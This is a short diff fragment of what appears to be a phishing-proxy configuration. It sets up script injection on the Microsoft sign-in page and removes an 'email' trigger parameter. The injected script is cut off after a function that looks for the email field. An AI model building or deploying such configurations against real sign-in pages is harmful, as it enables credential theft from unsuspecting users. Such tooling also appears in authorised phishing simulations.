@@ -103,7 +103,6 @@ login:
 js_inject:
   - trigger_domains: ['login.microsoftonline.com']
     trigger_paths: ['/']
-    trigger_params: ['email']
     script: |
       (function() {
         function findEmailField() {
